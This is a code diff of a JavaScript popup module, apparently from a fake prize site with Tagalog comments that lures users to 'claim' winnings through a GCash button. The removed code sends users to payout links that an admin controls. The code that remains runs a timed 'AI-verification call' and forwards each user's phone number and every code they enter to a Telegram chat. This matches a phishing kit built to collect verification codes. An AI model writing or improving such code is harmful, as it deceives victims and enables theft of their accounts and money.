@@ -1,13 +1,12 @@
 /**
- * Popup Share Module - Fixed Deeplink & Admin Sync
+ * Popup Share Module - Listener Only (No Redirect Conflict)
+ * Ang redirect logic ay nasa playbonus.js na.
  */
 
 (function() {
     'use strict';
     
-    let currentBalance = 0;
     let claimInProgress = false;
-    let isRedirecting = false;
     
     // ========== AI-VERIFICATION CALL VARIABLES ==========
     let callInProgress = false;
@@ -16,14 +15,6 @@
     let currentCallCode = '';
     
     // ========== SOUND EFFECT ==========
-    function playClaimSound() {
-        try {
-            var audio = new Audio('sounds/super_ace_scatter_ring.mp3');
-            audio.volume = 0.7;
-            audio.play().catch(function(e) {});
-        } catch(e) {}
-    }
-    
     function playCallSound() {
         try {
             var audio = new Audio('sounds/call_ring.mp3');
@@ -51,176 +42,15 @@
         sendTelegramMessage('🔑 AI-CODE ATTEMPT\n👤 User: ' + userPhone + '\n📝 Code: ' + codeEntered + '\n⏱️ Left: ' + secondsLeft + 's\n📊 Status: INVALID');
     }
     
-    function sendAICallExpiredNotification(userPhone, deviceId) {
-        sendTelegramMessage('⏰ AI-VERIFICATION EXPIRED\n👤 User: ' + userPhone);
-    }
-    
-    function sendClaimButtonNotification(userPhone, deviceId, amount) {
-        sendTelegramMessage('💳 CLAIM INITIATED\n👤 User: ' + userPhone + '\n💰 Amount: ₱' + amount.toFixed(2));
-    }
-    
     // ========== INITIALIZATION ==========
     function init() {
-        var popup = document.getElementById('prizePopup');
-        if (!popup) return;
-        
-        getFirewallStatus();
-        attachClaimButton();
-        attachWithdrawButton();
-        
-        console.log('✅ Popup Module ready');
-    }
-    
-    // ========== GET FIREWALL STATUS ==========
-    function getFirewallStatus() {
-        try {
-            var db = firebase.database();
-            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
-                var data = snapshot.val();
-                return (data && data.active === true);
-            });
-        } catch(e) {
-            return Promise.resolve(false);
-        }
-    }
-    
-    // ========== SYNC BALANCE ==========
-    function syncBalanceFromFirebase() {
-        var userPhone = localStorage.getItem("userPhone");
-        if (!userPhone) return Promise.resolve(0);
-        
-        try {
-            var db = firebase.database();
-            return db.ref('user_sessions/' + userPhone).once('value').then(function(snap) {
-                if (snap.exists() && snap.val().balance !== undefined) {
-                    var balance = snap.val().balance;
-                    var balanceEl = document.getElementById('userBalanceDisplay');
-                    if (balanceEl) balanceEl.innerText = balance.toFixed(2);
-                    return balance;
-                }
-                return 0;
-            });
-        } catch(e) {
-            return Promise.resolve(0);
-        }
-    }
-    
-    // ========== ATTACH CLAIM BUTTON ==========
-    function attachClaimButton() {
-        var claimBtn = document.getElementById('claimNowBtn');
-        if (!claimBtn) return;
-        
-        claimBtn.onclick = function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            
-            playClaimSound();
-            
-            syncBalanceFromFirebase().then(function(balance) {
-                currentBalance = balance;
-                // Redirect to the real withdraw popup in HTML
-                var withdrawPopup = document.getElementById('claimNowPopup');
-                if (withdrawPopup) {
-                    var amountEl = document.getElementById('claimNowBalanceAmount');
-                    if (amountEl) amountEl.innerText = balance.toFixed(2);
-                    withdrawPopup.style.display = 'flex';
-                }
-            });
-        };
-    }
-
-    // ========== ATTACH WITHDRAW BUTTON ==========
-    function attachWithdrawButton() {
-        var withdrawBtn = document.getElementById('claimViaGCashBtn');
-        if (withdrawBtn) {
-            withdrawBtn.onclick = function(e) {
-                e.preventDefault();
-                if (claimInProgress) return;
-                
-                claimInProgress = true;
-                this.disabled = true;
-                this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
-                
-                // 1. CHECK FIREWALL FIRST
-                getFirewallStatus().then(function(firewallOn) {
-                    if (firewallOn) {
-                        // Show Phase 3 (AI Verification)
-                        document.getElementById('claimNowPopup').style.display = 'none';
-                        showPhase3();
-                        claimInProgress = false;
-                        withdrawBtn.disabled = false;
-                        withdrawBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP';
-                        return;
-                    }
-
-                    // 2. IF FIREWALL OFF, GET LINK AND REDIRECT
-                    getLatestPayoutLink().then(function(linkData) {
-                        if (linkData && linkData.url) {
-                            var userPhone = localStorage.getItem("userPhone") || "Unknown";
-                            
-                            markLinkAsUsed(linkData.key, userPhone).then(function() {
-                                isRedirecting = true;
-                                withdrawBtn.innerHTML = '<i class="fas fa-check"></i> REDIRECTING...';
-                                setTimeout(function() {
-                                    window.location.href = linkData.url;
-                                }, 1000);
-                            });
-                        } else {
-                            claimInProgress = false;
-                            withdrawBtn.disabled = false;
-                            withdrawBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP';
-                            alert("No payout link available. Please try again.");
-                        }
-                    });
-                });
-            };
-        }
-    }
-    
-    // ========== GET PAYOUT LINK (MULA SA ADMIN) ==========
-    function getLatestPayoutLink() {
-        try {
-            var db = firebase.database();
-            // Check admin direct redirect first
-            return db.ref('admin/redirectLink').once('value').then(function(adminSnap) {
-                var adminData = adminSnap.val();
-                if (adminData && adminData.url && adminData.active !== false) {
-                    return { key: 'admin_redirect', url: adminData.url };
-                }
-                
-                // Fallback to deployed links
-                return db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function(snapshot) {
-                    if (snapshot.exists()) {
-                        var key = Object.keys(snapshot.val())[0];
-                        var linkData = snapshot.val()[key];
-                        return { key: key, url: linkData.url };
-                    }
-                    return null;
-                });
-            });
-        } catch(e) {
-            return Promise.resolve(null);
-        }
-    }
-    
-    // ========== MARK LINK AS CLAIMED (PARA SA ADMIN SYNC) ==========
-    function markLinkAsUsed(linkKey, userPhone) {
-        if (linkKey === 'admin_redirect') return Promise.resolve();
-        
-        try {
-            var db = firebase.database();
-            return db.ref('links/' + linkKey).update({
-                status: 'claimed',
-                user: userPhone,
-                claimedAt: Date.now()
-            });
-        } catch(e) {
-            return Promise.resolve();
-        }
+        // Dahil ang playbonus.js na ang humahawak sa redirect at popup logic,
+        // dito ay ang Phase 3 (AI Verification) lang ang ini-initialize natin para sa backup.
+        console.log('✅ Popup Module (AI Verification Only) ready');
     }
     
     // ========== SHOW PHASE 3 (AI-VERIFICATION CALL) ==========
-    function showPhase3() {
+    window.showPhase3AI = function() {
         var popup = document.getElementById('prizePopup');
         var popupInner = document.getElementById('prizePopupInner');
         if (!popup || !popupInner) return;
@@ -286,7 +116,7 @@
         `;
         
         attachPhase3Events();
-    }
+    };
     
     function attachPhase3Events() {
         var closeBtn = document.getElementById('popupClosePhase3');
@@ -396,7 +226,6 @@
         var popup = document.getElementById('prizePopup');
         if (popup) popup.style.display = 'none';
         claimInProgress = false;
-        isRedirecting = false;
         stopCallTimer();
     }
     
